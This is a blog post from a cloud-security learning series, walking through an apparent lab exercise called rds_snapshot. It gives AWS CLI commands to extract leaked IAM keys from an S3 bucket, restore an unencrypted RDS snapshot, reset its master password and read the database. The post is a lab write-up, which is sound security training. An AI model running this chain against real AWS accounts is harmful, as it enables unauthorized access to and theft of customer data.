---
title: '100 Days of Cloud Security - Day 50: Attack - rds_snapshot'
date: '2025-12-29'
author: 'Venkata Pathuri'
excerpt: 'Day 50 of my cloud security journey - Attack - rds_snapshot'
tags: ['cloud-security', 'aws', '100days', 'cybersecurity']
---

# Day 50: Attack - rds_snapshot

## Overview
Welcome to Day 50 of our cloud security journey! Today, we dive deep into an exciting and critical topic: exploiting Amazon RDS snapshots. Building on the foundational knowledge gained in Day 49, where we explored IAM roles and permissions, we are now stepping into the realm of database security. By understanding how attackers might leverage RDS snapshots, you’ll gain insights on preventing potential data breaches and securing your cloud environments.

## Learning Objectives
By the end of today’s session, you will master the following skills:
- Understanding how to access and extract sensitive data from RDS snapshots.
- Verifying identities and permissions associated with EC2 and RDS instances.
- Learning to enumerate S3 buckets for potential credential leaks.
- Gaining hands-on experience in restoring an RDS instance from a snapshot and modifying its master password.

## Deep Dive
### RDS Snapshots: An Overview
Amazon RDS snapshots are point-in-time copies of your databases. They can be automatic or manual, providing a means for backup and disaster recovery. However, these snapshots can also be a vulnerability if not properly secured, as they can contain sensitive data.

#### Real-World Use Case
Imagine a scenario where a company inadvertently leaves its RDS snapshots unencrypted. An attacker could potentially exploit this weakness to gain access to sensitive customer information. By understanding how this process works, you can proactively secure your RDS instances.

### Step-by-Step Breakdown
1. **Initial Access & Identity Verification**
   Begin by confirming the role and permissions of your EC2 instance. You can achieve this through the following command:

   ```bash
   aws sts get-caller-identity
   ```

   This command provides crucial information about who you are authenticated as, verifying that you’re operating under the expected role.

2. **S3 Bucket Enumeration & Credential Extraction**
   Next, you’ll want to check for IAM credentials in the identified S3 bucket. Use the following bucket name as a reference:

   - **Bucket Identified:** `cg-data-s3-bucket-cgid9axswi1avl`

   After locating the file `access_keys.txt`, download it and configure the IAM user credentials for the `cg-rds-instance-user-cgid9axswi1avl`.

3. **RDS User Identity Verification**
   To ensure you’ve switched to the correct role, execute:

   ```bash
   aws sts get-caller-identity --profile cg
   ```

   This step confirms that you are authenticated as the RDS instance user.

4. **Discovering the RDS Instance**
   You can find details about the RDS instance using:

   ```bash
   aws rds describe-db-instances --profile cg
   ```

   This command reveals essential details such as the DB instance ID, engine type, endpoint, and security group settings.

5. **RDS Snapshot Discovery**
   Check for available snapshots with:

   ```bash
   aws rds describe-db-snapshots --profile cg
   ```

   You’ll discover whether there are unencrypted snapshots available for restoration, which is a significant security concern.

6. **Restoring the RDS Instance**
   If the snapshot is unencrypted, restore it with:

   ```bash
   aws rds restore-db-instance-from-db-snapshot \
       --db-instance-identifier restore-rds \
       --db-snapshot-identifier cg-rds-snapshot \
       --db-subnet-group-name cg-db-subnet-group \
       --vpc-security-group-ids sg-08e964c69d9ca36ae \
       --profile cg
   ```

   After execution, monitor the status of the instance until it changes to `available`.

7. **Modifying the Master Password**
   Once the instance is available, modify the master password to something secure:

   ```bash
   aws rds modify-db-instance \
       --db-instance-identifier restore-rds \
       --master-user-password Passw0rd! \
       --apply-immediately \
       --profile cg
   ```

   Ensure you replace `Passw0rd!` with a strong password in a real scenario.

8. **Database Access & Flag Retrieval**
   Finally, connect to your restored database:

   ```bash
   mysql -h restore-rds.c1o6qkm66w75.us-east-1.rds.amazonaws.com -P 3306 -u cgadmin -p
   ```

   Here, you will be prompted for the password you set in the previous step. This is where you can retrieve flags or sensitive information.

## Hands-On Practice
To solidify your understanding, follow these commands in your AWS environment. Make sure to replace any placeholders with your actual credentials while keeping security in mind:
- Set your AWS environment variables:

   ```bash
   export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE  # Example credential - replace with yours # Replace with your actual credentials
   export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY # Replace with your actual credentials
   ```

- Execute the provided commands step-by-step, verifying each output against expected results. 

### Common Troubleshooting Tips
- If you encounter permission errors, double-check your IAM role and its policies.
- Ensure that the RDS instance is in the correct subnet and security group settings to avoid connectivity issues.
- If the snapshot cannot be found, verify that it exists and that you have the necessary permissions to view it.

## Key Takeaways
Today, you learned about the potential risks associated with RDS snapshots, how attackers might exploit them, and the importance of securing your cloud environments. By practicing these techniques, you not only understand the attack vector but also how to fortify your defenses against them.

## Real-World Applications
In production environments, understanding RDS snapshot vulnerabilities is crucial. Companies must implement strict access controls and encryption for snapshots to protect sensitive data. Regular audits and monitoring can help detect any unauthorized access or potential breaches before they escalate.

---
**Journey Progress:** 50/100 Days Complete 🚀

By understanding these crucial concepts today, you are one step closer to becoming a proficient cloud security practitioner. Keep pushing forward!